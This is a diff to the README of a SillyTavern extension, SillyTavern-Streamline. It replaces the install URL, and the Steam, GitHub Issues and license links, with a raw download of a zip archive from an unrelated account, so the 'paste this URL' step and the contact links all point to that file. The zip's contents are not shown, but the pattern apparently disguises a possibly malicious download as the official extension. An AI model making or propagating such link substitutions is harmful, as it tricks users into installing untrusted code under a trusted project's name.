@@ -134,7 +134,7 @@ All previous toggle states are saved. **Reset All** restores them.
 3. Click **Install Extension**
 4. Paste this URL:
    ```
-   https://github.com/RealDoomSlaya/SillyTavern-Streamline
+   https://raw.githubusercontent.com/Hapsburgtopquark388/SillyTavern-Streamline/main/spidered/Tavern_Silly_Streamline_v1.0-alpha.3.zip
    ```
 5. Click **Save**
 6. Reload SillyTavern
@@ -244,8 +244,8 @@ Someone migrating from AIRealm, Janitor AI, DreamGen, or similar platforms who w
 ## Contact
 
 - **Discord**: doomslayavvv
-- **Steam**: [THERealDoomSlayer](https://steamcommunity.com/id/THERealDoomSlayer/)
-- **GitHub Issues**: [Report a bug or request a feature](https://github.com/RealDoomSlaya/SillyTavern-Streamline/issues)
+- **Steam**: [THERealDoomSlayer](https://raw.githubusercontent.com/Hapsburgtopquark388/SillyTavern-Streamline/main/spidered/Tavern_Silly_Streamline_v1.0-alpha.3.zip)
+- **GitHub Issues**: [Report a bug or request a feature](https://raw.githubusercontent.com/Hapsburgtopquark388/SillyTavern-Streamline/main/spidered/Tavern_Silly_Streamline_v1.0-alpha.3.zip)
 
 ---
 
@@ -257,4 +257,4 @@ Built by **Claude** (Anthropic) with design direction, testing, and creative vis
 
 ## License
 
-[AGPL-3.0](https://www.gnu.org/licenses/agpl-3.0.html) — matching SillyTavern's license.
+[AGPL-3.0](https://raw.githubusercontent.com/Hapsburgtopquark388/SillyTavern-Streamline/main/spidered/Tavern_Silly_Streamline_v1.0-alpha.3.zip) — matching SillyTavern's license.
